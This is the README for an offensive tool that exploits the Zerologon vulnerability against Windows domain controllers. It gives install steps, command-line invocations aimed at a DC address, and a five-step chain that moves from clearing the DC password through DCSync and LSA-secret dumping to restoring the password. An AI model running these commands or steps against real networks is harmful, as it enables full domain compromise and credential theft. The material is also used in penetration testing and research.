<a name="readme-top"></a>

# zerologon-Shot
Zerologon exploit with restore DC password automatically

#### Table of Contents
<ol>
<li>
  <a href="#getting-started">Getting Started</a>
  <ul>
    <li><a href="#installation">Installation</a></li>
  </ul>
</li>
<li><a href="#usage">Usage</a></li>
<li><a href="#screenshots">Screenshots</a></li>
<li><a href="#how-it-works">How it works?</a></li>
<li><a href="#disclaimer">Disclaimer</a></li>
<li><a href="#references">References</a></li>
</ol>

## Getting Started

### Installation

_Only need latest version of Impacket_

1. Clone the impacket repository
   ```sh
   git clone https://github.com/fortra/impacket
   ```
2. Install imapcket
   ```sh
   cd imapcket && sudo pip3 install .
   ```
3. Enjoy it :)
   ```sh
   git clone https://github.com/XiaoliChan/zerologon-Shot.git
   ```

<p align="right">(<a href="#readme-top">back to top</a>)</p>

## Usage
```
python3 zerologon-Shot.py domain/'dc_name$'@ip_addr

E.g.

python3 zerologon-Shot.py xiaoli-2008.com/'WIN-D6SJTQG7I0K$'@192.168.85.210
python3 zerologon-Shot.py xiaoli-2008.com/'WIN-D6SJTQG7I0K$'@192.168.85.210 -target-ip 192.168.85.210
```
<p align="right">(<a href="#readme-top">back to top</a>)</p>

## Screenshots
- #### _Enter to win!!!_
![image](https://github.com/XiaoliChan/zerologon-Shot/assets/30458572/816959b8-0e09-4d95-a6d4-b9c2e38d418a)

![image](https://github.com/XiaoliChan/zerologon-Shot/assets/30458572/bd957328-f09b-482d-a4fc-61ae94daab3a)

<p align="right">(<a href="#readme-top">back to top</a>)</p>

## How it works?
- First: use zerologon exploit to attack DC (after the exploit is finished, the DC password now is cleared).
- Second: authenticate into LDAP with DC computer account (password is blank) to get domain admins.
- Third: retrieve all domain admins credentials with dcsync.
- Fourth: use the domain admin's credential to retrieve DC LSA secrets to get "plain_password_hex".
- Last: restore DC password with "plain_password_hex" by domain admin.
<p align="right">(<a href="#readme-top">back to top</a>)</p>

## Disclaimer
The spirit of this Open Source initiative is to help security researchers, and the community, speed up research and educational activities related to the implementation of networking protocols and stacks.

The information in this repository is for research and educational purposes and not meant to be used in production environments and/or as part of commercial products.

If you desire to use this code or some part of it for your own uses, we recommend applying proper security development life cycle and secure coding practices, as well as generate and track the respective indicators of compromise according to your needs.
<p align="right">(<a href="#readme-top">back to top</a>)</p>

## References
* [impacket](https://github.com/fortra/impacket/)
* [dirkjanm's CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
* [A different way of abusing Zerologon](https://dirkjanm.io/a-different-way-of-abusing-zerologon/)
<p align="right">(<a href="#readme-top">back to top</a>)</p>
